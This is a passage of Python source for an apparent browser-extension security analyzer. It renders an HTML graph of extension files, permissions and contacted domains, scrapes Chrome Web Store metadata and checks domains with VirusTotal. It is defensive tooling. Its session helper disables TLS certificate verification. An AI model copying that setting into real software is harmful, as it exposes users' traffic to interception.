        #header {{ position: absolute; top: 20px; left: 20px; right: 20px; padding: 16px 24px; border-radius: 16px; z-index: 10; display: flex; justify-content: space-between; align-items: center; animation: slideDown 0.6s cubic-bezier(0.16, 1, 0.3, 1); pointer-events: none; }}
        #header button, #header input {{ pointer-events: auto; }}
        #search-box {{ background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.2); border-radius: 6px; padding: 8px 14px; color: #fff; font-family: 'Outfit'; font-size: 13px; width: 200px; outline: none; transition: border-color 0.2s; }}
        #search-box:focus {{ border-color: #4fc3f7; }}
        #search-box::placeholder {{ color: #8fa0c1; }}
        .risk-badge {{ display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: 700; letter-spacing: 0.5px; margin-left: 12px; }}
        #header h2 {{ margin: 0; font-size: 20px; font-weight: 600; background: linear-gradient(90deg, #fff, #aeb2d5); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        #header .meta {{ font-size: 13px; color: #8fa0c1; margin-top: 4px; font-weight: 300; }}
        #network-container {{ flex-grow: 1; width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 1; outline: none; }}
        #legend {{ position: absolute; bottom: 20px; left: 20px; padding: 16px; border-radius: 16px; z-index: 10; font-size: 13px; animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) 0.1s both; pointer-events: auto; }}
        .detail-block {{ background: rgba(0,0,0,0.3); border-radius: 8px; padding: 12px; margin-bottom: 16px; border: 1px solid rgba(255,255,255,0.05); }}
        .detail-block h4 {{ margin: 0 0 8px 0; font-size: 12px; color: #4fc3f7; text-transform: uppercase; letter-spacing: 1px; }}
        pre.code-block {{ background: #0b0c10; padding: 12px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', monospace; font-size: 12px; color: #aeb2d5; border: 1px solid rgba(255,255,255,0.1); max-height: 400px; overflow-y: auto; white-space: pre-wrap; }}
        .leg-item {{ display: flex; align-items: center; margin: 8px 0; color: #cbd5e1; transition: all 0.2s; }}
        .leg-item.hidden {{ opacity: 0.35; text-decoration: line-through; }}
        .leg-item:hover {{ color: #fff; }}
        .leg-label {{ cursor: pointer; transition: transform 0.2s; }}
        .leg-label:hover {{ transform: translateX(4px); }}
        .leg-toggle {{ cursor: pointer; margin-left: auto; font-size: 14px; padding: 2px 6px; border-radius: 4px; transition: all 0.2s; user-select: none; }}
        .leg-toggle:hover {{ background: rgba(255,255,255,0.1); }}
        .leg-dot {{ width: 12px; height: 12px; border-radius: 50%; margin-right: 12px; box-shadow: 0 0 10px currentColor; }}
        .leg-star {{ width: 16px; height: 16px; margin-right: 12px; background: currentColor; clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%); filter: drop-shadow(0 0 5px currentColor); }}
        .leg-diamond {{ width: 10px; height: 10px; margin-right: 14px; background: currentColor; transform: rotate(45deg); box-shadow: 0 0 10px currentColor; }}
        #loading {{ position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 20; display: flex; flex-direction: column; align-items: center; transition: opacity 0.4s; pointer-events: none; }}
        .spinner {{ width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-radius: 50%; border-top-color: #4fc3f7; animation: spin 1s ease-in-out infinite; margin-bottom: 16px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        @keyframes slideDown {{ from {{ transform: translateY(-20px); opacity: 0; }} to {{ transform: translateY(0); opacity: 1; }} }}
        @keyframes slideUp {{ from {{ transform: translateY(20px); opacity: 0; }} to {{ transform: translateY(0); opacity: 1; }} }}
        div.vis-tooltip {{ background-color: rgba(15, 17, 26, 0.95) !important; border: 1px solid rgba(255, 255, 255, 0.1) !important; border-radius: 8px !important; color: #fff !important; font-family: 'Outfit', sans-serif !important; font-size: 13px !important; padding: 10px 14px !important; box-shadow: 0 4px 20px rgba(0,0,0,0.5) !important; backdrop-filter: blur(8px) !important; max-width: 300px; white-space: normal !important; }}
    </style>
</head>
<body>

<div id="header" class="glass" style="position:relative;">
    <div>
        <h2>Extension Process Tree <span class="risk-badge" style="background:{risk_color}22; color:{risk_color}; border:1px solid {risk_color}66;">Risk: {rs}/100 {risk_label}</span></h2>
        <div class="meta">{ext_name_safe} v{ext.version} &bull; {len(files_data)} files &bull; {len(all_domains)} domains &bull; {len(perm_groups)} permissions &bull; {len(obfuscated_set)} obfuscated</div>
    </div>
    <div style="display:flex; gap:8px; align-items:center;">
        <input id="search-box" type="text" placeholder="Search nodes..." oninput="searchNodes(this.value)">
        <button id="toggle-expand-btn" onclick="toggleExpandAll()" style="background:rgba(79, 195, 247, 0.15); border:1px solid rgba(79, 195, 247, 0.5); color:#fff; padding:8px 16px; border-radius:6px; cursor:pointer; font-family:'Outfit'; font-size:13px; font-weight:600; transition:background 0.2s; white-space:nowrap;">Expand All</button>
    </div>
</div>

<div id="legend" class="glass">
    <div style="font-weight: 600; margin-bottom: 12px; color: #fff;">Legend <span style="font-size:11px;font-weight:300;color:#8fa0c1">(click 👁 to toggle)</span></div>
    <div class="leg-item" id="leg-script"><div class="leg-dot" style="background:#4fc3f7; color: #4fc3f7;"></div><span class="leg-label" onclick="filterByGroup('script')">Script (.js, .ts)</span><span class="leg-toggle" onclick="toggleCategory('script', 'leg-script')">👁</span></div>
    <div class="leg-item" id="leg-html"><div class="leg-dot" style="background:#81c784; color: #81c784;"></div><span class="leg-label" onclick="filterByGroup('html')">HTML Target</span><span class="leg-toggle" onclick="toggleCategory('html', 'leg-html')">👁</span></div>
    <div class="leg-item" id="leg-style"><div class="leg-dot" style="background:#ce93d8; color: #ce93d8;"></div><span class="leg-label" onclick="filterByGroup('style')">Stylesheet (.css)</span><span class="leg-toggle" onclick="toggleCategory('style', 'leg-style')">👁</span></div>
    <div class="leg-item" id="leg-data"><div class="leg-dot" style="background:#a1887f; color: #a1887f;"></div><span class="leg-label" onclick="filterByGroup('data')">Data (.json)</span><span class="leg-toggle" onclick="toggleCategory('data', 'leg-data')">👁</span></div>
    <div class="leg-item" id="leg-perm"><div class="leg-dot" style="background:#ef5350; color: #ef5350;"></div><span class="leg-label" onclick="filterByGroup('perm')">Risk Node</span><span class="leg-toggle" onclick="toggleCategory('perm', 'leg-perm')">👁</span></div>
    <div class="leg-item" id="leg-obfuscated"><div class="leg-dot" style="background:#ff1744; color: #ff1744;"></div><span class="leg-label" onclick="filterByGroup('obfuscated')">Potentially Obfuscated File</span><span class="leg-toggle" onclick="toggleCategory('obfuscated', 'leg-obfuscated')">👁</span></div>
    <div class="leg-item" id="leg-domain"><div class="leg-diamond" style="color: #ff7043;"></div><span class="leg-label" onclick="filterByGroup('domain')">External Domain/IP</span><span class="leg-toggle" onclick="toggleCategory('domain', 'leg-domain')">👁</span></div>
    <div style="margin-top:16px; font-size:11px; color:#8fa0c1; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 12px;">🖱️ Click = info &bull; 🖱️ DblClick = expand &bull; 🔍 Scroll = zoom</div>
</div>

<div id="sidebar" class="glass">
    <div class="close-btn" onclick="document.getElementById('sidebar').classList.remove('active')">&times;</div>
    <div id="sidebar-content"></div>
</div>

<div id="left-sidebar" class="glass">
    <div class="close-btn-left" onclick="document.getElementById('left-sidebar').classList.remove('active')">&times;</div>
    <div id="left-sidebar-content"></div>
</div>

<div id="loading"><div class="spinner"></div><div style="font-size: 14px; color: #8fa0c1;">Mapping Flow...</div></div>
<div id="network-container"></div>

<script>
document.addEventListener('DOMContentLoaded', function() {{
    const rawNodes = {nodes_json};
    const rawLinks = {links_json};
    const fileDomains = {file_domains_json};
    const fileContents = {file_contents_json};
    const permsDict = {perms_dict_json};
    const obfuscatedFiles = {obfuscated_json};

    const colors = {{
        script: {{background: "#4fc3f7", border: "#0288d1"}},
        html: {{background: "#81c784", border: "#388e3c"}},
        style: {{background: "#ce93d8", border: "#8e24aa"}},
        data: {{background: "#a1887f", border: "#5d4037"}},
        domain: {{background: "#ff7043", border: "#e64a19"}},
        obfuscated: {{background: "#ff1744", border: "#d50000"}},
        perm_critical: {{background: "#ef5350", border: "#c62828"}},
        perm_high: {{background: "#ef5350", border: "#c62828"}},
        perm_medium: {{background: "#ffa726", border: "#ef6c00"}},
        perm_low: {{background: "#66bb6a", border: "#2e7d32"}},
        perm_host: {{background: "#90a4ae", border: "#455a64"}},
        perm_varies: {{background: "#ffa726", border: "#ef6c00"}}
    }};

    const linkColors = {{contacts: "#ff7043", imports: "#4fc3f7"}};

    const edgesData = rawLinks.map(l => ({{
        id: l.source + "_" + l.target,
        from: l.source,
        to: l.target,
        title: l.type,
        color: {{ color: linkColors[l.type] || '#555', opacity: 0.6 }},
        arrows: 'to',
        dashes: l.type === "imports"
    }}));

    const nodesData = rawNodes.map(n => {{
        let isObfuscated = obfuscatedFiles.includes(n.label);
        let effectiveGroup = isObfuscated ? "obfuscated" : n.group;
        let c = colors[effectiveGroup] || {{background: "#999", border: "#666"}};
        let isRisk = n.group && n.group.startsWith("perm");
        let isDomain = n.group === "domain";
        let nodeSize = isRisk ? 28 : (isDomain ? 24 : Math.min(25, Math.max(12, (n.size || 6))));
        
        let incoming = edgesData.filter(e => e.to === n.id).length;
        let children = edgesData.filter(e => e.from === n.id).map(e => e.to);
        
        let isRoot = incoming === 0;
        let isIsolated = incoming === 0 && children.length === 0;
        let hasChildren = children.length > 0;
        
        let baseLabel = n.label.length > 25 ? n.label.slice(0, 22) + '...' : n.label;
        let finalLabel = baseLabel;
        if (hasChildren) finalLabel = "[+] " + finalLabel;

        let tip = `<div style="font-size: 14px; font-weight: 600; margin-bottom: 4px;">${{n.label}}</div>`;
        tip += `<div style="font-size: 12px; color: #cbd5e1; margin-bottom: 8px;">Type: ${{n.group}}</div>`;
        if (fileDomains[n.label] && fileDomains[n.label].length > 0) {{
            tip += `<div style="color: #cbd5e1; font-size: 11px;">Contacts: ${{fileDomains[n.label].length}} external hosts</div>`;
        }}

        return {{
            id: n.id,
            label: finalLabel,
            baseLabel: baseLabel,
            fullLabel: n.label,
            groupType: effectiveGroup,
            originalColor: c,
            color: c,
            value: nodeSize,
            shape: isObfuscated ? "hexagon" : (isRisk ? "star" : (isDomain ? "diamond" : "dot")),
            title: tip,
            isRoot: isRoot,
            isIsolated: isIsolated,
            isExpanded: false
        }};
    }});

    // Setup True Live Dataset (For real dynamic expand/collapse)
    const liveNodes = new vis.DataSet();
    const liveEdges = new vis.DataSet();

    nodesData.forEach(n => {{
        if (n.isRoot && !n.isIsolated) {{
            liveNodes.add(n);
        }}
    }});

    const container = document.getElementById('network-container');
    const loading = document.getElementById('loading');
    
    const data = {{ nodes: liveNodes, edges: liveEdges }};
    
    const options = {{
        nodes: {{
            font: {{ color: '#ffffff', face: 'Outfit', size: 12 }},
            borderWidth: 2, borderWidthSelected: 4,
            shadow: {{ enabled: true, color: 'rgba(0,0,0,0.5)', size: 10, x: 0, y: 4 }}
        }},
        edges: {{ width: 1, smooth: {{ type: 'continuous' }}, hoverWidth: 2, selectionWidth: 3 }},
        physics: {{ 
            enabled: true, 
            solver: 'forceAtlas2Based',
            forceAtlas2Based: {{ gravitationalConstant: -90, centralGravity: 0.01, springLength: 100, springConstant: 0.08 }}
        }},
        interaction: {{ hover: true, tooltipDelay: 100, dragNodes: true, zoomView: true }}
    }};
    
    const network = new vis.Network(container, data, options);
    
    network.on("stabilizationIterationsDone", function() {{
        const loading = document.getElementById('loading');
        if(loading) loading.style.display = "none";
    }});
    
    // Search nodes function
    window.searchNodes = function(query) {{
        query = query.toLowerCase().trim();
        if (!query) {{
            // Reset all nodes to original colors
            liveNodes.get().forEach(ln => {{
                let orig = nodesData.find(n => n.id === ln.id);
                if (orig) liveNodes.update({{ id: ln.id, color: orig.originalColor, opacity: 1.0 }});
            }});
            return;
        }}
        let matchIds = new Set();
        nodesData.forEach(n => {{
            if (n.fullLabel.toLowerCase().includes(query)) matchIds.add(n.id);
        }});
        liveNodes.get().forEach(ln => {{
            let orig = nodesData.find(n => n.id === ln.id);
            if (matchIds.has(ln.id)) {{
                liveNodes.update({{ id: ln.id, color: orig ? orig.originalColor : ln.color, opacity: 1.0 }});
            }} else {{
                liveNodes.update({{ id: ln.id, color: {{ background: '#333', border: '#222' }}, opacity: 0.15 }});
            }}
        }});
        // Focus on first match
        let firstMatch = liveNodes.get().find(ln => matchIds.has(ln.id));
        if (firstMatch) network.focus(firstMatch.id, {{ scale: 0.8, animation: true }});
    }};

    // Toggle Expand / Collapse All
    let allExpanded = false;
    window.toggleExpandAll = function() {{
        const btn = document.getElementById('toggle-expand-btn');
        if (!allExpanded) {{
            // Expand all
            nodesData.forEach(n => {{
                let children = edgesData.filter(e => e.from === n.id);
                if (children.length > 0) {{
                    n.isExpanded = true;
                    if (!liveNodes.get(n.id)) liveNodes.add(n);
                    liveNodes.update({{ id: n.id, label: "[-] " + n.baseLabel }});
                }}
            }});
            edgesData.forEach(e => {{
                if (!liveEdges.get(e.id)) liveEdges.add(e);
                let toNode = nodesData.find(x => x.id === e.to);
                if (toNode && !liveNodes.get(e.to)) liveNodes.add(toNode);
                let fromNode = nodesData.find(x => x.id === e.from);
                if (fromNode && !liveNodes.get(e.from)) liveNodes.add(fromNode);
            }});
            allExpanded = true;
            btn.textContent = 'Collapse All';
            btn.style.borderColor = 'rgba(239, 83, 80, 0.5)';
            btn.style.background = 'rgba(239, 83, 80, 0.15)';
        }} else {{
            // Collapse back to roots only
            liveEdges.clear();
            liveNodes.clear();
            nodesData.forEach(n => {{
                n.isExpanded = false;
                let children = edgesData.filter(e => e.from === n.id);
                n.label = (children.length > 0 ? "[+] " : "") + n.baseLabel;
                if (n.isRoot && !n.isIsolated) {{
                    liveNodes.add(n);
                }}
            }});
            allExpanded = false;
            btn.textContent = 'Expand All';
            btn.style.borderColor = 'rgba(79, 195, 247, 0.5)';
            btn.style.background = 'rgba(79, 195, 247, 0.15)';
        }}
        network.fit();
    }};

    // Category visibility toggle
    const hiddenCategories = new Set();
    window.toggleCategory = function(groupPrefix, elemId) {{
        const el = document.getElementById(elemId);
        if (hiddenCategories.has(groupPrefix)) {{
            // Show category
            hiddenCategories.delete(groupPrefix);
            el.classList.remove('hidden');
            // Re-add nodes of this type that should be visible
            nodesData.forEach(n => {{
                if (n.groupType && n.groupType.startsWith(groupPrefix)) {{
                    // Only add if it's a root/isolated OR its parent is expanded
                    let parentEdges = edgesData.filter(e => e.to === n.id);
                    let shouldShow = (n.isRoot && !n.isIsolated);
                    parentEdges.forEach(pe => {{
                        let parent = nodesData.find(p => p.id === pe.from);
                        if (parent && parent.isExpanded && liveNodes.get(pe.from)) shouldShow = true;
                    }});
                    if (shouldShow && !liveNodes.get(n.id)) liveNodes.add(n);
                }}}});
            // Re-add edges where both endpoints are visible
            edgesData.forEach(e => {{
                if (liveNodes.get(e.from) && liveNodes.get(e.to) && !liveEdges.get(e.id)) {{
                    liveEdges.add(e);
                }}
            }});
        }} else {{
            // Hide category
            hiddenCategories.add(groupPrefix);
            el.classList.add('hidden');
            let toRemoveNodes = [];
            let toRemoveEdges = [];
            nodesData.forEach(n => {{
                if (n.groupType && n.groupType.startsWith(groupPrefix) && liveNodes.get(n.id)) {{
                    toRemoveNodes.push(n.id);
                }}}});
            edgesData.forEach(e => {{
                if (toRemoveNodes.includes(e.from) || toRemoveNodes.includes(e.to)) {{
                    if (liveEdges.get(e.id)) toRemoveEdges.push(e.id);
                }}
            }});
            liveEdges.remove(toRemoveEdges);
            liveNodes.remove(toRemoveNodes);
        }}
        network.fit();
    }};

    window.jumpToNode = function(nodeId) {{
        nodeId = parseInt(nodeId);
        let nd = nodesData.find(n => n.id === nodeId);
        if (nd && !liveNodes.get(nodeId)) {{
            liveNodes.add(nd);
        }}
        // Also ensure parent edges leading to this node are visible
        edgesData.filter(e => e.to === nodeId).forEach(e => {{
            if (!liveEdges.get(e.id)) liveEdges.add(e);
        }});
        network.selectNodes([nodeId]);
        network.focus(nodeId, {{ scale: 1.0, animation: true }});
        showNodeInfo(nodeId);
    }};

    // Setup Sidebar Interactivity
    window.filterByGroup = function(groupPrefix) {{
        let matching = nodesData.filter(n => n.groupType && n.groupType.startsWith(groupPrefix));
        const leftSidebar = document.getElementById('left-sidebar');
        const lsc = document.getElementById('left-sidebar-content');
        
        let header = groupPrefix === 'domain' ? "External Domains & IPs" : 
                     groupPrefix.startsWith('perm') ? "Risk Permissions" : 
                     "Files (" + groupPrefix + ")";
                     
        let html = `<h3>${{header}} (${{matching.length}})</h3>`;
        html += `<div class="detail-block"><ul style="margin:0;padding-left:20px;max-height:80vh;overflow-y:auto;overflow-x:hidden;">`;
        matching.forEach(n => {{
            html += `<li style="margin-bottom:4px;word-break:break-all;"><a href="#" style="color:#4fc3f7;text-decoration:none;" onclick="jumpToNode(${{n.id}}); return false;">${{escapeHtml(n.fullLabel)}}</a></li>`;
        }});
        html += `</ul></div>`;
        lsc.innerHTML = html;
        leftSidebar.classList.add('active');
    }};

    function escapeHtml(unsafe) {{
        return (unsafe || "").toString()
             .replace(/&/g, "&amp;")
             .replace(/</g, "&lt;")
             .replace(/>/g, "&gt;")
             .replace(/"/g, "&quot;")
             .replace(/'/g, "&#039;");
    }}
    
    function addDescendants(nodeId) {{
        let childEdges = edgesData.filter(e => e.from === nodeId);
        childEdges.forEach(e => {{
            if (!liveEdges.get(e.id)) liveEdges.add(e);
            if (!liveNodes.get(e.to)) {{
                let cn = nodesData.find(n => n.id === e.to);
                if (cn) liveNodes.add(cn);
            }}
        }});
    }}

    function removeDescendants(nodeId) {{
        let stack = [nodeId];
        let toRemoveEdges = [];
        let toRemoveNodes = [];
        
        while(stack.length > 0) {{
            let curr = stack.pop();
            let childEdges = edgesData.filter(e => e.from === curr);
            childEdges.forEach(e => {{
                toRemoveEdges.push(e.id);
                toRemoveNodes.push(e.to);
                stack.push(e.to);
            }});
        }}
        
        liveEdges.remove(toRemoveEdges);
        let safeToRemove = toRemoveNodes.filter(nId => {{
            return liveEdges.get().filter(le => le.to === nId).length === 0;
        }});
        liveNodes.remove(safeToRemove);
        
        safeToRemove.forEach(nId => {{
            let nInfo = nodesData.find(n => n.id === nId);
            if(nInfo) {{
                nInfo.isExpanded = false;
                nInfo.label = (edgesData.filter(e => e.from === nId).length > 0 ? "[+] " : "") + nInfo.baseLabel;
            }}
        }});
    }}

    function showNodeInfo(nodeId) {{
        const sidebar = document.getElementById('sidebar');
        const sc = document.getElementById('sidebar-content');
        const originalData = nodesData.find(n => n.id === nodeId);
        if(!originalData) return;
        
        let html = `<h3>${{escapeHtml(originalData.fullLabel)}}</h3>`;
        html += `<div class="detail-block"><h4>Classification</h4>${{originalData.groupType.toUpperCase()}}</div>`;
        
        if (originalData.groupType.startsWith("perm")) {{
            let pdata = permsDict[originalData.fullLabel];
            if (pdata) {{
                html += `<div class="detail-block"><h4 style="color:#ef5350">Risk Level: ${{pdata.risk_level}}</h4><div>${{escapeHtml(pdata.description)}}</div></div>`;
                if (pdata.legitimate_uses && pdata.legitimate_uses.length > 0) {{
                    html += `<div class="detail-block"><h4 style="color:#81c784">Legitimate Uses</h4><ul style="margin:0;padding-left:20px">`;
                    pdata.legitimate_uses.forEach(u => html += `<li>${{escapeHtml(u)}}</li>`);
                    html += `</ul></div>`;
                }}
                if (pdata.malicious_uses && pdata.malicious_uses.length > 0) {{
                    html += `<div class="detail-block"><h4 style="color:#ef5350">Malicious Vectors</h4><ul style="margin:0;padding-left:20px;color:#ffb3b3">`;
                    pdata.malicious_uses.forEach(u => html += `<li style="color:#ffb3b3">${{escapeHtml(u)}}</li>`);
                    html += `</ul></div>`;
                }}
            }}
        }} else if (originalData.groupType === "domain") {{
             let callers = edgesData.filter(e => e.to === nodeId).map(e => nodesData.find(n => n.id === e.from));
             if(callers.length) {{
                 html += `<div class="detail-block"><h4>Called By Files</h4><ul style="margin:0;padding-left:20px;word-break:break-all">`;
                 callers.forEach(c => html += `<li style="margin-bottom:4px">${{escapeHtml(c.fullLabel)}}</li>`);
                 html += `</ul></div>`;
             }}
        }} else {{
            if (fileDomains[originalData.fullLabel] && fileDomains[originalData.fullLabel].length > 0) {{
                html += `<div class="detail-block"><h4>Network Indicators Extracted</h4><ul style="margin:0;padding-left:20px;word-break:break-all">`;
                fileDomains[originalData.fullLabel].forEach(d => html += `<li style="margin-bottom:4px">${{escapeHtml(d)}}</li>`);
                html += `</ul></div>`;
            }}
            if (fileContents[originalData.fullLabel]) {{
                let cText = fileContents[originalData.fullLabel];
                if (cText.length > 5000) cText = cText.substring(0, 5000) + "\\n\\n... [TRUNCATED]";
                html += `<div class="detail-block"><h4>Source View (Preview)</h4><pre class="code-block">${{escapeHtml(cText)}}</pre></div>`;
            }} else {{
                html += `<div class="detail-block"><h4>Source View</h4><div style="color:#8fa0c1;font-style:italic">Source code not included in this export.</div></div>`;
            }}
        }}

        sc.innerHTML = html;
        sidebar.classList.add('active');
    }}

    function toggleNodeExpand(nodeId) {{
        const originalData = nodesData.find(n => n.id === nodeId);
        if(!originalData) return;
        
        let childrenEdges = edgesData.filter(e => e.from === nodeId);
        if (childrenEdges.length > 0) {{
            if (!originalData.isExpanded) {{
                originalData.isExpanded = true;
                liveNodes.update({{ id: nodeId, label: "[-] " + originalData.baseLabel }});
                addDescendants(nodeId);
            }} else {{
                originalData.isExpanded = false;
                liveNodes.update({{ id: nodeId, label: "[+] " + originalData.baseLabel }});
                removeDescendants(nodeId);
            }}
        }}
    }}

    network.on("click", function (params) {{
        if (params.nodes.length > 0) {{
            showNodeInfo(params.nodes[0]);
        }} else {{
            document.getElementById('sidebar').classList.remove('active');
        }}
    }});

    network.on("doubleClick", function (params) {{
        if (params.nodes.length > 0) {{
            toggleNodeExpand(params.nodes[0]);
        }}
    }});
    
    window.addEventListener('resize', () => network.fit());
}});
</script>
</body>
</html>"""

            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(html)
            return True
        except Exception as e:
            self.log(f"Failed to generate extension graph: {e}")
            return False

    def batch_extract_domains(self, extension_ids: List[str], output_file: str = None,
                              progress_callback=None) -> Dict:
        """Download extensions by ID from the Chrome Web Store and extract all domains/IPs.

        Args:
            extension_ids: List of extension IDs to analyze
            output_file: Optional path to write results (CSV or text)
            progress_callback: Optional callable(current, total, ext_id, ext_name) for progress

        Returns:
            Dict with per-extension results and an aggregated domain list
        """
        import tempfile
        results = {
            "extensions": [],
            "all_domains": {},  # domain -> list of {ext_id, ext_name, files}
            "errors": [],
        }
        tmp_dir = Path(tempfile.mkdtemp(prefix="remedex_batch_"))

        for i, ext_id in enumerate(extension_ids):
            ext_id = ext_id.strip()
            if not ext_id or len(ext_id) != 32 or not ext_id.isalnum():
                results["errors"].append(f"Skipped invalid ID: {ext_id!r}")
                continue

            if progress_callback:
                progress_callback(i, len(extension_ids), ext_id, "downloading...")

            try:
                downloader = ExtensionDownloader(output_dir=str(tmp_dir), verbose=False)
                dl_result = downloader.download(ext_id, extract=True)
                extracted_dir = dl_result.get("extracted_dir")
                if not extracted_dir or not Path(extracted_dir).exists():
                    results["errors"].append(f"{ext_id}: download succeeded but extraction failed")
                    continue

                ext = self.scan_extension_from_path(str(extracted_dir))

                if progress_callback:
                    progress_callback(i, len(extension_ids), ext_id, ext.name)

                ext_entry = {
                    "id": ext_id,
                    "name": ext.name,
                    "version": ext.version,
                    "domains": dict(ext.extracted_domains),
                    "domain_count": len(ext.extracted_domains),
                    "permissions": ext.permissions,
                    "host_permissions": ext.host_permissions,
                    "risk": ext.calculate_risk_level(),
                }
                results["extensions"].append(ext_entry)

                for dom, files in ext.extracted_domains.items():
                    if dom not in results["all_domains"]:
                        results["all_domains"][dom] = []
                    results["all_domains"][dom].append({
                        "ext_id": ext_id,
                        "ext_name": ext.name,
                        "files": files,
                    })

            except Exception as e:
                results["errors"].append(f"{ext_id}: {e}")

        # Cleanup temp dir
        try:
            import shutil
            shutil.rmtree(tmp_dir, ignore_errors=True)
        except Exception:
            pass

        # Write output file if requested
        if output_file:
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write("Domain/IP,Extension ID,Extension Name,Source Files\n")
                    for dom in sorted(results["all_domains"].keys()):
                        for entry in results["all_domains"][dom]:
                            files_str = '; '.join(entry["files"][:5])
                            f.write(f"{dom},{entry['ext_id']},{entry['ext_name']},{files_str}\n")
                self.log(f"Results written to {output_file}")
            except Exception as e:
                results["errors"].append(f"Failed to write output: {e}")

        return results

    def _create_cws_session(self) -> 'requests.Session':
        """Create a reusable session for Chrome Web Store requests."""
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Accept-Language": "en-US,en;q=0.9",
        })
        session.verify = False
        return session

    def _parse_cws_html(self, html: str, meta: Dict[str, Any]) -> None:
        """Extract user count, rating, and featured status from CWS HTML."""
        user_match = re.search(r'>([\d,]+)\+?\s*users<', html, re.IGNORECASE)
        if user_match:
            raw = user_match.group(1).replace(",", "")
            try:
                meta["users"] = int(raw)
                meta["users_display"] = user_match.group(1).strip() + " users"
            except ValueError:
                pass

        rating_match = re.search(r'(\d(?:\.\d)?)\s*out of\s*5', html)
        if rating_match:
            try:
                meta["rating"] = round(float(rating_match.group(1)), 1)
            except ValueError:
                pass

        rating_count_match = re.search(r'>([\d,.]+[KkMm]?)\s*ratings?<', html, re.IGNORECASE)
        if rating_count_match:
            meta["rating_count"] = rating_count_match.group(1).strip()

        if re.search(r'>Featured<', html):
            meta["featured"] = True

    def fetch_webstore_metadata(self, extension_id: str, session=None) -> Dict[str, Any]:
        """Fetch metadata from the Chrome Web Store for an extension.

        Downloads the CWS detail page and parses user count, rating, and
        featured status.  Reuses the provided session to avoid repeated
        TLS handshakes.  Concurrent callers share the session for speed.

        Returns a dict with keys: users, users_display, rating, rating_count,
        featured, store_url.  Empty dict on failure.
        """
        meta: Dict[str, Any] = {}
        store_url = f"https://chromewebstore.google.com/detail/{extension_id}"
        meta["store_url"] = store_url

        try:
            if not REQUESTS_AVAILABLE:
                return meta

            own_session = session is None
            if own_session:
                session = self._create_cws_session()

            resp = session.get(store_url, timeout=12)
            if resp.status_code != 200:
                meta["error"] = f"HTTP {resp.status_code}"
                return meta

            self._parse_cws_html(resp.text, meta)

            if own_session:
                session.close()

        except requests.exceptions.RequestException as e:
            meta["error"] = f"Network error: {e}"
        except Exception as e:
            meta["error"] = f"Parse error: {e}"

        return meta

    def enrich_extensions_metadata(self, extensions: List[Extension] = None,
                                    progress_callback=None) -> int:
        """Fetch Chrome Web Store metadata for a list of extensions.

        Fetches in parallel with 10 workers (one session per worker).
        Deduplicates by ID so each unique extension is only fetched once.

        Returns the number of extensions successfully enriched.
        """
        from concurrent.futures import ThreadPoolExecutor, as_completed

        if extensions is None:
            extensions = self.extensions_cache

        seen_ids: Dict[str, Dict] = {}
        unique_exts = []
        for ext in extensions:
            if ext.id in seen_ids:
                continue
            seen_ids[ext.id] = None
            if ext.id not in self._webstore_meta_by_id:
                unique_exts.append(ext)

        total = len(unique_exts)
        enriched = 0
        if total == 0:
            return 0
        if not REQUESTS_AVAILABLE:
            return 0

        def _fetch_one(ext_obj):
            sess = self._create_cws_session()
            try:
                return ext_obj, self.fetch_webstore_metadata(ext_obj.id, session=sess)
            finally:
                sess.close()

        completed = 0
        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = {pool.submit(_fetch_one, ext): ext for ext in unique_exts}
            for future in as_completed(futures):
                ext, meta = future.result()
                seen_ids[ext.id] = meta
                ext.webstore_meta = meta
                if meta is not None:
                    self._webstore_meta_by_id[ext.id] = dict(meta)
                if meta and meta.get("users") is not None:
                    enriched += 1
                completed += 1
                if progress_callback:
                    progress_callback(completed - 1, total, ext.id, ext.name)

        for ext in extensions:
            if ext.id in seen_ids and not ext.webstore_meta:
                ext.webstore_meta = seen_ids[ext.id]

        return enriched

    def scan_with_virustotal(self, ext: Extension, api_key: str, rate_limit: float = None) -> Dict:
        """Scan extension domains/IPs against VirusTotal API (skip files to avoid rate-limits)"""
        import re
        try:
            from urllib.request import Request, urlopen
        except ImportError:
            return {"error": "urllib not available"}

        results = {"file_hashes": [], "domain_results": [], "errors": [], "rate_used": 4}
        headers = {"x-apikey": api_key}

        # Auto-detect premium vs free by checking user quota
        if rate_limit is None:
            try:
                req = Request(f"https://www.virustotal.com/api/v3/users/{api_key}/overall_quotas", headers=headers)
                resp = urlopen(req, timeout=10)
                quota_data = json.loads(resp.read().decode())
                api_req = quota_data.get("data", {}).get("api_requests_hourly", {})
                allowed = api_req.get("user", {}).get("allowed", 240)
                # Free tier = 240/hour (4/min). Premium is typically much higher.
                if allowed > 300:
                    rate_limit = min(30, allowed / 60)  # cap at 30 req/min for safety
                    results["rate_used"] = rate_limit
                else:
                    rate_limit = 4
            except Exception:
                rate_limit = 4

        delay = 60.0 / rate_limit

        for host in list(ext.extracted_domains.keys())[:30]:
            entry = {"domain": host, "vt_result": None}
            try:
                is_ip = bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host))
                api_ext = "ip_addresses" if is_ip else "domains"
                gui_ext = "ip-address" if is_ip else "domain"
                
                req = Request(f"https://www.virustotal.com/api/v3/{api_ext}/{host}", headers=headers)
                resp = urlopen(req, timeout=15)
                data = json.loads(resp.read().decode())
                stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                entry["vt_result"] = {
                    "malicious": stats.get("malicious", 0),
                    "suspicious": stats.get("suspicious", 0),
                    "undetected": stats.get("undetected", 0),
                    "harmless": stats.get("harmless", 0),
                    "link": f"https://www.virustotal.com/gui/search/{host.strip()}"
                }
            except Exception as e:
